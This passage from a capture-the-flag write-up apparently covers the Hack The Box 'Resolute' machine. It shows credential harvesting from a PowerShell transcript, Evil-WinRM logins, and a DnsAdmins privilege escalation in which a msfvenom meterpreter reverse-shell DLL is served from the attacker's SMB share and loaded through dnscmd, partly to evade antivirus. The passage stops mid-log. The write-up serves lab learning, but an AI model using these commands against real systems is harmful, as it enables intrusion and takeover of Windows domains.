<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> evil-winrm <span class="keyword">on</span>  master via 💎 v2<span class="number">.7</span><span class="number">.0</span> </span><br><span class="line">❯ ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> -u melanie -p Welcome123!</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; whoami</span><br><span class="line">megabank\melanie</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>This one of the easiest <code>user</code> part I experienced now let’s grab the <code>user.txt</code> to the privilege escalation.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; Get-Content <span class="string">"user.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"></span><br><span class="line">Lines Words Characters Property</span><br><span class="line">----- ----- ---------- --------</span><br><span class="line">          <span class="number">1</span>         <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Transfer-file-with-SAMBA"><a href="#Transfer-file-with-SAMBA" class="headerlink" title="Transfer file with SAMBA"></a>Transfer file with SAMBA</h3><p>the enumeration starts again, i try to transfer first <code>winPEAS.exe</code> it is similar to <code>LinEnum.sh</code> for Linux kernel, it helps penetration testers to find some useful info that thet can use for privilege escalation so first i setup my <code>smb</code> configuration.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string - Samba Server %v</span><br><span class="line">netbios name = Payas0</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name to resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line"><span class="built_in">bind</span> interfaces only = yes</span><br><span class="line"></span><br><span class="line">[medz]</span><br><span class="line">path = /root/htb/boxes/Resolute/</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure>

<p>then start service :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ smbd service restart</span><br></pre></td></tr></table></figure>

<p>now copy the <code>winPEAS.exe</code> with samba</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; copy \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\medz\winPEAS.exe</span><br></pre></td></tr></table></figure>

<p>but this one failed me. The machine has <code>Anti-virus</code> it always disconnect me when I try to transfer a file like <code>nc.exe</code> or <code>winPEAS</code> so let’s do another thing’ enumerate the directories.</p>
<h3 id="Hidden-directories"><a href="#Hidden-directories" class="headerlink" title="Hidden directories"></a>Hidden directories</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd /</span><br><span class="line">*Evil-WinRM* PS C:\&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--hs-        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">40</span> AM                $RECYCLE.BIN</span><br><span class="line">d--hsl        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Documents and Settings</span><br><span class="line">d--h--        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">48</span> AM                ProgramData</span><br><span class="line">d--h--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">32</span> AM                PSTranscripts</span><br><span class="line">d--hs-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Recovery</span><br><span class="line">d--hs-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">25</span> AM                System Volume Information</span><br><span class="line">-arhs-       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">5</span>:<span class="number">59</span> PM         <span class="number">389408</span> bootmgr</span><br><span class="line">-a-hs-        <span class="number">7</span>/<span class="number">16</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">10</span> AM              <span class="number">1</span> BOOTNXT</span><br><span class="line">-a-hs-        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">15</span> PM      <span class="number">402653184</span> pagefile.sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt;</span><br></pre></td></tr></table></figure>

<p>The <code>PSTranscripts</code> is very interesting because that is not a default file of a windows. so looking inside of that folder :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; cd PSTranscripts</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--h--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM                <span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt;</span><br></pre></td></tr></table></figure>

<p><code>dir</code> command will not show what’s really inside of the folder so I use <code>ls -hidden</code> to show the hidden files. and there’s another folder <code>20191203</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; cd <span class="number">20191203</span></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts\<span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-arh--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM           <span class="number">3732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU<span class="number">.20191203063201</span>.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt;</span><br></pre></td></tr></table></figure>

<p>very interesting ! let’s see what’s inside of that text file.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; more PowerShell_transcript.RESOLUTE.OJuoBGhU<span class="number">.20191203063201</span>.txt</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063201</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;TerminatingError(): <span class="string">"System error."</span></span><br><span class="line">&gt;&gt; CommandInvocation(Invoke-Expression): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="string">"Command"</span>; <span class="keyword">value</span>=<span class="string">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')</span></span><br><span class="line"><span class="string">if (!$?) &#123; if($LASTEXITCODE) &#123; exit $LASTEXITCODE &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"Stream"</span>; <span class="keyword">value</span>=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;ParameterBinding(Out-String): name=<span class="string">"InputObject"</span>; <span class="keyword">value</span>=<span class="string">"PS megabank\ryan@RESOLUTE Documents&gt; "</span></span><br><span class="line">PS megabank\ryan@RESOLUTE Documents&gt;</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(Invoke-Expression): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="string">"Command"</span>; <span class="keyword">value</span>=<span class="string">"cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!$?) &#123; if($LASTEXITCODE) &#123; exit $LASTEXITCODE &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"Stream"</span>; <span class="keyword">value</span>=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"InputObject"</span>; <span class="keyword">value</span>=<span class="string">"The syntax of this command is:"</span></span><br><span class="line">cmd : The syntax of <span class="keyword">this</span> command <span class="keyword">is</span>:</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">cmd : The syntax of <span class="keyword">this</span> command <span class="keyword">is</span>:</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt;</span><br></pre></td></tr></table></figure>

<p>looking at this I got another user <code>ryan</code> and his possible password <code>Serv3r4Admin4cc123!</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure>

<p>Now from <code>melanie</code> i switch to user <code>ryan</code> and starts the enumeration again.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> evil-winrm <span class="keyword">on</span>  master via 💎 v2<span class="number">.7</span><span class="number">.0</span> </span><br><span class="line">❯ ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> -u ryan -p <span class="string">'Serv3r4Admin4cc123!'</span> -e . -s .</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory"><a href="#Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory" class="headerlink" title="Abusing DNSAdmins privilege for escalation in Active Directory"></a>Abusing DNSAdmins privilege for escalation in Active Directory</h3><p>Now let’s start to enumerate it again i checked it with <code>whoami</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name     SID</span><br><span class="line">============= ==============================================</span><br><span class="line">megabank\ryan S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1105</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-1</span><span class="number">-0</span>                                        Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Users                              Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-545</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Pre-Windows <span class="number">2000</span> Compatible Access Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-554</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Remote Management Users            Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-580</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-2</span>                                        Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span>                                       Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\This Organization             Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-15</span>                                       Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">MEGABANK\Contractors                       Group            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1103</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1101</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span>, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-64</span><span class="number">-10</span>                                    Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S<span class="number">-1</span><span class="number">-16</span><span class="number">-8192</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======                                                                                                                      </span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                                                      </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                      </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="keyword">set</span> Enabled                                                                                                                      </span><br><span class="line">                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                          </span><br><span class="line">USER CLAIMS INFORMATION                                                                                                                                                                   </span><br><span class="line">-----------------------                                                                                                                                                                   </span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support <span class="keyword">for</span> Dynamic Access Control <span class="keyword">on</span> <span class="keyword">this</span> device has been disabled.</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>looking at this line’ <code>ryan</code> is part of <strong>DNSAdmin Group</strong>. This privilege is prone to privilege escation vulnerabilty which allows any user inside this grupo to make the DNS service load an arbitrary DLL correctly constructed.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1101</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span>, Local Group</span><br></pre></td></tr></table></figure>

<p>with this help of this <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">article</a> and this <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">one</a> we can get the administrator from <code>DNS</code></p>
<h3 id="Creating-malicious-DLL"><a href="#Creating-malicious-DLL" class="headerlink" title="Creating malicious DLL"></a>Creating malicious DLL</h3><p>we know that the machine’ have <code>anti-virus</code> so I can’t load a malicious file inside to get a reverse shell. so I tried to use <code>impacket-smbserver</code> to load my <code>dll</code> file from my operating system and bypass the av protection. so first I created a dll file with <code>msfvenom</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.187 LPORT=9001 -a x64 -f dll &gt; main.dll</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 5120 bytes</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute 12s</span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<p>Next i setup my <code>impacket-smbserver</code> in the path where my <code>dll</code> is loaded .</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE /root/htb/boxes/Resolute</span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>

<h3 id="Setup-Impacket-smbserver"><a href="#Setup-Impacket-smbserver" class="headerlink" title="Setup Impacket-smbserver"></a>Setup Impacket-smbserver</h3><p>next is to load my <code>dll</code> file in the entry <code>serverlevelplugindll</code> in the box :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd /config /serverlevelplugindll \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE\main.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>to make sure that i successfully connect it we can checked it with this command :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dir \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"></span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">36</span> PM             <span class="number">12</span> password.txt</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">31</span>/<span class="number">2020</span>   <span class="number">5</span>:<span class="number">13</span> AM           <span class="number">5120</span> main.dll</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">03</span> PM           <span class="number">3512</span> nmap-Resolute</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">32</span> PM            <span class="number">154</span> users.txt</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">7</span>:<span class="number">51</span> PM          <span class="number">59392</span> nc.exe</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">5</span>:<span class="number">18</span> PM         <span class="number">241664</span> winPEAS.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>Success ! the machine has connected with my operating system as they can view my files to the path where i set my <code>SHARE</code> my <code>impacket-smbserver</code> is also responding.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE /root/htb/boxes/Resolute</span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.169,59611)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (\,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\ authenticated successfully</span><br><span class="line">[*] :::00::4141414141414141</span><br><span class="line">[*] Disconnecting Share(1:SHARE)</span><br><span class="line">[*] Handle: <span class="string">'ConnectionResetError'</span> object is not subscriptable</span><br><span class="line">[*] Closing down connection (10.10.10.169,59611)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection 